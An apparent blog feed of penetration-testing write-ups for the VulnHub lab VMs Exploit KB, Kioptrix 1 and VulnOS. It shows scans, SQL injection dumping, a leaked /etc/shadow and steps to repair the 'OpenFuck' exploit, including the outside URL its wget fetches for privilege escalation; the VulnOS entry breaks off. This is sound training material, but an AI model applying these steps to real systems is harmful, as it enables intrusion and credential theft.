<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[My portfolio]]></title>
  <link href="http://paulsec.github.io/atom.xml" rel="self"/>
  <link href="http://paulsec.github.io/"/>
  <updated>2014-04-15T21:00:13+02:00</updated>
  <id>http://paulsec.github.io/</id>
  <author>
    <name><![CDATA[Paul A. (PaulSec)]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Exploit KB Vulnerable Web App 1: Write-up]]></title>
    <link href="http://paulsec.github.io/blog/2014/04/15/exploit-kb-vulnerable-web-app-1-write-up/"/>
    <updated>2014-04-15T20:29:34+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/04/15/exploit-kb-vulnerable-web-app-1-write-up</id>
    <content type="html"><![CDATA[<p><strong>This post contains the steps to get a root shell with Exploit KB Vulnerable Web App 1 VM</strong></p>

<p>This VM can he found <a href="http://vulnhub.com/entry/exploit-kb-vulnerable-web-app-1,44/">here</a>. Have a look to find even more VMs</p>

<h3><strong>Host discovery</strong></h3>

<p>First, we need to discover where the machine is on our network.
To do so, let&rsquo;s use Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sP 192.168.1.1/24 </span></code></pre></td></tr></table></div></figure>


<h3><strong>Fingerprinting</strong></h3>

<p>After getting the IP address, we need to do some fingerprinting.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV 192.168.1.23</span></code></pre></td></tr></table></div></figure>


<p><img src="http://paulsec.github.io/images/exploit-kb/nmap-result.png" width="75%" height="75%"/></p>

<p><em>Fig. Nmap scan result</em></p>

<p>As we saw it, there were only two services available on this host: SSH and Apache.
I decided to use Nikto to scan the Web server.</p>

<p>Here are the report :</p>

<p><img src="http://paulsec.github.io/images/exploit-kb/nikto-result.png" width="75%" height="75%"/></p>

<p><em>Fig. Nikto report on ports 80 (HTTP)</em></p>

<p>There were (loads) of interesting things here, but some of the most interesting :</p>

<ul>
<li>/database/</li>
<li>/admin/</li>
<li>and the website itself !</li>
</ul>


<p>Let&rsquo;s exploit it !</p>

<h3><strong>Exploitation</strong></h3>

<p>First, there&rsquo;s some <em>directory listing</em> on /database/ and there was an interesting backup: <strong>exploit.sql</strong>.
In this file, we managed to gather some credentials which were not hashed !</p>

<p><img src="http://paulsec.github.io/images/exploit-kb/directory-listing-exploit.png" width="50%" height="50%"/></p>

<p><em>Fig. Directory Listing of /database/</em></p>

<p><img src="http://paulsec.github.io/images/exploit-kb/exploit-sql.png" width="50%" height="50%"/></p>

<p><em>Fig. SQL Backup: Exploit.sql</em></p>

<p>Then, we were able to connect to the platform.</p>

<p><img src="http://paulsec.github.io/images/exploit-kb/admin-login-page.png" width="50%" height="50%"/></p>

<p><em>Fig. Admin login page</em></p>

<p><img src="http://paulsec.github.io/images/exploit-kb/admin-logged.png" width="75%" height="75%"/></p>

<p><em>Fig. Connected as &lsquo;Admin&rsquo;</em></p>

<p>While playing with the application, some URLs were interesting :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.23/newspage.php?id=1</span></code></pre></td></tr></table></div></figure>


<p>I decided to check for some SQL injection and used SQLmap to exploit those:</p>

<p><img src="http://paulsec.github.io/images/exploit-kb/sqlmap-database.png" width="75%" height="75%"/></p>

<p><em>Fig. Dumping all databases through SQL Injection</em></p>

<p><img src="http://paulsec.github.io/images/exploit-kb/sqlmap-crack-password.png" width="75%" height="75%"/></p>

<p><em>Fig. Dumping all MySQL&rsquo;s users/passwords, and cracking them</em></p>

<p>Thanks to this vulnerability, we&rsquo;ve been able to dump the entire Database System (Which was a MySQL Backend System).
We managed to crack Mysql users&rsquo;s password which was&hellip;: <strong>toor</strong>.</p>

<p>With those (re-used &amp; weak) credentials, we were able to connect to the root&rsquo;s account through SSH.
Then, we had <em>root</em> access.</p>

<p><img src="http://paulsec.github.io/images/exploit-kb/shell-root-id.png" width="75%" height="75%"/></p>

<p><em>Fig. Connecting through SSH with root&rsquo;s credential</em></p>

<p><img src="http://paulsec.github.io/images/exploit-kb/shell-root-cat-shadow.png" width="75%" height="75%"/></p>

<p><em>Fig. Cat /etc/shadow</em></p>

<p>Really easy VM but really interesting one to practice with.</p>

<p>Hope you liked it ! Cheers.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix 1: Write-up]]></title>
    <link href="http://paulsec.github.io/blog/2014/04/14/kioptrix-1-write-up/"/>
    <updated>2014-04-14T21:52:50+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/04/14/kioptrix-1-write-up</id>
    <content type="html"><![CDATA[<p><strong>This post contains the steps to get a root shell with Kioptrix level 1 VM</strong></p>

<p>This VM can he found <a href="http://vulnhub.com/entry/kioptrix_level-1-1,22/">here</a>. Have a look to find even more VMs</p>

<h4><strong>Host discovery</strong></h4>

<p>First, we need to discover where the machine is on our network.
To do so, let&rsquo;s use Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sP 192.168.1.1/24 </span></code></pre></td></tr></table></div></figure>


<h4><strong>Fingerprinting</strong></h4>

<p>After getting the IP address, we need to do some fingerprinting.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV 192.168.1.2</span></code></pre></td></tr></table></div></figure>


<p><img src="http://paulsec.github.io/images/kioptrix/1/nmap.png" width="75%" height="75%"/></p>

<p><em>Fig. Nmap scan result</em></p>

<p>As I saw it in the scan report, I decided to scan on the port 80 and 443 with <strong>DirBuster</strong> and <strong>Nikto</strong>.</p>

<p>Here are the reports :</p>

<p><img src="http://paulsec.github.io/images/kioptrix/1/dirbuster.png" width="75%" height="75%"/></p>

<p><em>Fig. DirBuster Report on the port 80</em></p>

<p><img src="http://paulsec.github.io/images/kioptrix/1/nikto.png" width="75%" height="75%"/></p>

<p><em>Fig. Nikto report on ports 80 (HTTP) and 443 (HTTPS)</em></p>

<p>There was no vulnerable web application or any interesting file.
However, the Apache version is vulnerable..</p>

<h4><strong>Exploitation with Apache OpenSSL Exploit</strong></h4>

<p>Thanks to Nmap result, I saw that the Apache version was vulnerable: <strong>Apache 1.3.20</strong>.
Then, I decided to look on the internet and I found this expoit: <a href="http://www.exploit-db.com/exploits/764/">Apache OpenSSL &ndash; Remote Exploit (Multiple Targets) (OpenFuckV2.c)</a></p>

<p>I had issues with this exploit because it&rsquo;s quite an old one and the instructions were outdated.
You can follow the instructions <a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">here</a> to update the exploit and run it on your computer. (Tested on <a href="http://www.kali.org/">Kali Linux</a>).</p>

<p>We had information on the box and I did a <code>grep</code> to see what OS were vulnerable to Apache 1.3.20 :</p>

<p><img src="http://paulsec.github.io/images/kioptrix/1/openfuck_select.png" width="75%" height="75%"/></p>

<p><em>Fig. Selecting the option (depending on the OS) for the exploit</em></p>

<p>Then, I tried the exploit :</p>

<p><img src="http://paulsec.github.io/images/kioptrix/1/openfuck_exploit.png" width="75%" height="75%"/></p>

<p><em>Fig. Using OpenFuck Exploit after multiple attempts</em></p>

<h4><strong>Interesting files</strong></h4>

<p>We got the root shell and that was the goal of this VM.
Then, you can do everything like get content of <code>/etc/shadow</code>.</p>

<p><img src="http://paulsec.github.io/images/kioptrix/1/cat_shadow.png" width="75%" height="75%"/></p>

<p><em>Fig. Shadow file on the vulnerable server</em></p>

<p>Hope you liked it ! Cheers.</p>

<p>ps: I&rsquo;ll add exploitation using Samba in the next few days. Keep tuned !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Updating OpenFuck Exploit]]></title>
    <link href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/"/>
    <updated>2014-04-14T20:46:29+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit</id>
    <content type="html"><![CDATA[<p>This blog post will be quite fast and will provide you the steps to update the <a href="http://www.exploit-db.com/exploits/764/">OpenFuck</a> exploit.</p>

<p>This exploit is pretty old but you might need it if you have fun with some vulnerable VMs. Not giving any hint. :&ndash;)</p>

<p>Thanks to this <a href="http://hackingbalg.blogspot.fr/">blog</a>, I&rsquo;ve been able to update the exploit.</p>

<p>Here are the steps to make this work :</p>

<ul>
<li><strong>1) Add those headers :</strong></li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;openssl/rc4.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;openssl/md5.h&gt; </span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>2) Update the URL of the C file.</strong></li>
</ul>


<p>Search for <code>wget</code></p>

<p>and replace the URL with this new one :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="nl">http:</span><span class="c1">//dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>3) Get libssl-dev lib</strong></li>
</ul>


<p>Install them :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">libssl</span><span class="o">-</span><span class="n">dev</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>4) Update declaration of variables</strong></li>
</ul>


<p>Line 961, change :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">end</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By adding <strong>const</strong> :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">end</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>5) Compile then code and you&rsquo;re done</strong></li>
</ul>


<p>To compile :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">OpenFuck</span> <span class="mf">764.</span><span class="n">c</span> <span class="o">-</span><span class="n">lcrypto</span>
</span></code></pre></td></tr></table></div></figure>


<p>Hope this can help you out if you got stuck with this exploit. Cheers !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[VulnOS: Write-up]]></title>
    <link href="http://paulsec.github.io/blog/2014/04/08/vulnos-write-up/"/>
    <updated>2014-04-08T21:47:04+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/04/08/vulnos-write-up</id>
    <content type="html"><![CDATA[<p><strong>This contains the solution of the VM: VulnOS.</strong></p>

<p>This is my first write-up for a VM and I&rsquo;m doing it for VulnOS which is hosted on <a href="http://vulnhub.com/">VulnHub</a> (Great resource if you want to improve your pentesting skills).</p>

<p>In this &lsquo;tutorial&rsquo;, I&rsquo;m gonna give you the steps I reproduced to get a shell on the machine.</p>

<h4>Discovery</h4>

<p>First, start by scanning the network to discover where&rsquo;s the host.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV 192.168.56.1/24
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.41SVN ( http://nmap.org ) at 2014-04-08 21:23 CEST
</span><span class='line'>Nmap scan report for 192.168.56.1
</span><span class='line'>Host is up (0.00049s latency).
</span><span class='line'>Nmap scan report for 192.168.56.105
</span><span class='line'>Host is up (0.00018s latency).</span></code></pre></td></tr></table></div></figure>


<p>We managed to get the IP of the machine.
Let&rsquo;s do some fingerprinting.</p>

<h4>Fingerprinting</h4>

<p>I still used <a href="http://nmap.org/">nmap</a> to do this :
<img src="http://paulsec.github.io/images/vulnos/nmap_scan.png" width="75%" height="75%"/></p>

<p>Port 80 and 8080 are open. I used <a href="https://www.cirt.net/Nikto2">nikto</a> and <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">DirBuster</a> to do even more fingerprinting.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./nikto.pl -h http://192.168.56.105
</span><span class='line'>- Nikto v2.1.5
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.56.105
</span><span class='line'>+ Target Hostname:    192.168.56.105
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2014-04-08 21:29:47 (GMT2)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.2.14 (Ubuntu)
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, inode: 1062203, size: 745, mtime: 0x4f5c81e0490a0
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ Apache/2.2.14 appears to be outdated (current is at least Apache/2.2.22). Apache 1.3.42 (final release) and 2.0.64 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
</span><span class='line'>+ OSVDB-3268: /doc/: Directory indexing found.
</span><span class='line'>+ OSVDB-48: /doc/: The /doc/ directory is browsable. This may be /usr/doc.
</span><span class='line'>+ OSVDB-3268: /imgs/: Directory indexing found.
</span><span class='line'>+ OSVDB-3092: /imgs/: This might be interesting...
</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.23
</span><span class='line'>+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
</span><span class='line'>+ OSVDB-3093: /.htaccess: Contains authorization information
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ Cookie phpMyAdmin created without the httponly flag
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ Cookie 5d89dac18813e15aa2f75788275e3588 created without the httponly flag
</span><span class='line'>+ /phpldapadmin/: Admin login page/section found.
</span><span class='line'>+ Cookie PPA_ID created without the httponly flag
</span><span class='line'>+ /phppgadmin/: Admin login page/section found.
</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
</span><span class='line'>+ 6544 items checked: 0 error(s) and 19 item(s) reported on remote host
</span><span class='line'>+ End Time:           2014-04-08 21:30:08 (GMT2) (21 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested
</span></code></pre></td></tr></table></div></figure>


<p>I also used DirBuster to get some folders :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Starting OWASP DirBuster 0.12
</span><span class='line'>Starting dir/file list based brute forcing
</span><span class='line'>Dir found: /cgi-bin/ - 403
</span><span class='line'>Dir found: / - 200
</span><span class='line'>File found: /index2.html - 200
</span><span class='line'>Dir found: /imgs/ - 200
</span><span class='line'>Dir found: /icons/ - 200
</span><span class='line'>Dir found: // - 200
</span><span class='line'>Dir found: /icons/ - 200
</span><span class='line'>File found: //index2.html - 200
</span><span class='line'>Dir found: //imgs/ - 200
</span><span class='line'>Dir found: /phpmyadmin/ - 200
</span><span class='line'>Dir found: /phppgadmin/ - 200
</span><span class='line'>File found: /phpmyadmin/Documentation.html - 200
</span><span class='line'>Dir found: /phpmyadmin/themes/ - 403
</span><span class='line'>Dir found: /phpsysinfo/ - 200
</span><span class='line'>Dir found: /phpmyadmin/themes/original/ - 403
</span><span class='line'>Dir found: /phpmyadmin/themes/original/img/ - 403
</span><span class='line'>Dir found: /phpgroupware/ - 302
</span><span class='line'>File found: /phpsysinfo/index.php - 200
</span><span class='line'>File found: /phppgadmin/browser.php - 200
</span><span class='line'>File found: /phppgadmin/intro.php - 200
</span><span class='line'>File found: /phpmyadmin/index.php - 200
</span><span class='line'>Dir found: /imgs/ - 200
</span><span class='line'>Dir found: /phppgadmin/images/ - 403
</span><span class='line'>Dir found: /phppgadmin/images/themes/ - 403
</span><span class='line'>Dir found: /phppgadmin/images/themes/default/ - 403
</span><span class='line'>Dir found: /phppgadmin/xloadtree/ - 403
</span><span class='line'>File found: /phppgadmin/xloadtree/xtree2.js - 200
</span><span class='line'>File found: /phppgadmin/xloadtree/xloadtree2.js - 200
</span><span class='line'>File found: /phppgadmin/redirect.php - 200
</span><span class='line'>File found: /phppgadmin/servers.php - 200
</span><span class='line'>File found: /phpmyadmin/translators.html - 200
</span><span class='line'>File found: /phpmyadmin/license.php - 200
</span><span class='line'>File found: /phpmyadmin/changelog.php - 200
</span><span class='line'>Dir found: /phpmyadmin/setup/ - 401
</span><span class='line'>Dir found: /egroupware/ - 302
</span><span class='line'>Dir found: /insecure/ - 200
</span><span class='line'>File found: /insecure/LICENSE.txt - 200
</span><span class='line'>File found: /insecure/ReadMe.html - 200
</span><span class='line'>File found: /insecure/insecure.xml - 200
</span><span class='line'>File found: /insecure/insecure.war - 200
</span><span class='line'>Dir found: /mediawiki/ - 301
</span><span class='line'>Dir found: // - 200
</span><span class='line'>Dir found: /phpldapadmin/ - 200
</span><span class='line'>File found: /phpldapadmin/index.php - 200
</span><span class='line'>Dir found: /phpldapadmin/images/ - 403
</span><span class='line'>File found: /phpldapadmin/cmd.php - 200
</span><span class='line'>Dir found: /phpldapadmin/images/default/ - 200
</span><span class='line'>Dir found: /phpldapadmin/js/ - 403
</span><span class='line'>File found: /phpldapadmin/js/ajax_functions.js - 200
</span><span class='line'>Dir found: /phpldapadmin/js/jscalendar/ - 403
</span><span class='line'>File found: /phpldapadmin/js/jscalendar/calendar.js - 200
</span><span class='line'>File found: /phpldapadmin/js/layersmenu-browser_detection.js - 200
</span><span class='line'>File found: /phpldapadmin/js/ajax_tree.js - 200</span></code></pre></td></tr></table></div></figure>


<p>On the port 8080, nothing much with DirBuster :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Starting dir/file list based brute forcing
</span><span class='line'>Dir found: / - 200
</span><span class='line'>Dir found: /docs/ - 200
</span><span class='line'>Dir found: // - 200
</span><span class='line'>Dir found: // - 200</span></code></pre></td></tr></table></div></figure>


<p>And with Nikto:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./nikto.pl -h http://192.168.56.105:8080
</span><span class='line'>- Nikto v2.1.5
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.56.105
</span><span class='line'>+ Target Hostname:    192.168.56.105
</span><span class='line'>+ Target Port:        8080
</span><span class='line'>+ Start Time:         2014-04-08 21:55:59 (GMT2)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache-Coyote/1.1
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1887 0x1394395959000 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
</span><span class='line'>+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
</span><span class='line'>+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
</span><span class='line'>+ /: Appears to be a default Apache Tomcat install.
</span><span class='line'>+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
</span><span class='line'>+ Cookie JSESSIONID created without the httponly flag
</span><span class='line'>+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
</span><span class='line'>+ /manager/html: Default Tomcat Manager interface found
</span><span class='line'>+ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
</span><span class='line'>+ End Time:           2014-04-08 21:57:01 (GMT2) (62 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>Thanks to the nmap scan, there are a lot of services which are available.
I did lot of attempts to exploit MySQL, the IRC daemon, SMTP, .. but it didn&rsquo;t work.</p>

<p>Then, I decided to check Webmin service.</p>

<h4>Exploitation</h4>

<p>To do so, I started to use Metasploit to see if there was relevant exploit.
And there was one :</p>

<p><img src="http://paulsec.github.io/images/vulnos/metasploit_webmin_exploit.png" /></p>

<p>I decided to use <em>auxiliary/admin/webmin/file_disclosure</em>.</p>

<p>Using this flaw, I&rsquo;ve been able to get <strong>/etc/shadow</strong> because we have root privileges.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:*:16137:0:99999:7:::
</span><span class='line'>daemon:*:16137:0:99999:7:::
</span><span class='line'>bin:*:16137:0:99999:7:::
</span><span class='line'>sys:*:16137:0:99999:7:::
</span><span class='line'>sync:*:16137:0:99999:7:::
</span><span class='line'>games:*:16137:0:99999:7:::
</span><span class='line'>man:*:16137:0:99999:7:::
</span><span class='line'>lp:*:16137:0:99999:7:::
</span><span class='line'>mail:*:16137:0:99999:7:::
</span><span class='line'>news:*:16137:0:99999:7:::
</span><span class='line'>uucp:*:16137:0:99999:7:::
</span><span class='line'>proxy:*:16137:0:99999:7:::
</span><span class='line'>www-data:*:16137:0:99999:7:::
</span><span class='line'>backup:*:16137:0:99999:7:::
</span><span class='line'>list:*:16137:0:99999:7:::
</span><span class='line'>irc:*:16137:0:99999:7:::
</span><span class='line'>gnats:*:16137:0:99999:7:::
</span><span class='line'>nobody:*:16137:0:99999:7:::
</span><span class='line'>libuuid:!:16137:0:99999:7:::
</span><span class='line'>syslog:*:16137:0:99999:7:::
</span><span class='line'>landscape:*:16137:0:99999:7:::
</span><span class='line'>vulnosadmin:$6$SLXu95CH$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p.xbnSVJFAeg1WO28ljNAPrlXaghLmo/:16137:0:99999:7:::
</span><span class='line'>sysadmin:admin:16137:0:99999:7:::
</span><span class='line'>webmin:webmin:16137:0:99999:7:::
</span><span class='line'>hackme:hackme:16137:0:99999:7:::
</span><span class='line'>sa:password1:16137:0:99999:7:::
</span><span class='line'>stupiduser:stupiduser:16137:0:99999:7:::
</span><span class='line'>messagebus:*:16137:0:99999:7:::
</span><span class='line'>distccd:*:16137:0:99999:7:::
</span><span class='line'>sshd:*:16138:0:99999:7:::
</span><span class='line'>openldap:!:16138:0:99999:7:::
</span><span class='line'>ftp:!:16138:0:99999:7:::
</span><span class='line'>mysql:!:16138:0:99999:7:::
</span><span class='line'>telnetd:*:16138:0:99999:7:::
</span><span class='line'>bind:*:16138:0:99999:7:::
</span><span class='line'>postgres:*:16138:0:99999:7:::
</span><span class='line'>postfix:*:16138:0:99999:7:::
</span><span class='line'>dovecot:*:16138:0:99999:7:::
</span><span class='line'>tomcat6:*:16138:0:99999:7:::
</span><span class='line'>statd:*:16138:0:99999:7:::
</span><span class='line'>snmp:*:16138:0:99999:7:::
</span><span class='line'>nagios:!:16140:0:99999:7:::
</span><span class='line'>openerp:*:16140:0:99999:7:::</span></code></pre></td></tr></table></div></figure>


<p>We can now use this and (try to) crack the password with John the ripper.</p>

<p>However, this hasn&rsquo;t been successful for me.
So, I decided to get Apache&rsquo;s access logs.
Thanks to this, I&rsquo;ve been able to detect even more Web applications: MediaWiki, dolibarr-3.0.0, egroupware, And DVWA (Damn Vulnerable Web App)&hellip;</p>

<p>I also had access to all the files I wanted, so I gathered credentials for the database.
It was then possible to login through the phpmyadmin pannel using: <strong>webmin</strong>/<strong>webmin</strong>.</p>

<p><img src="http://paulsec.github.io/images/vulnos/phpmyadmin_wikiuser.png" width="75%" height="75%"/></p>

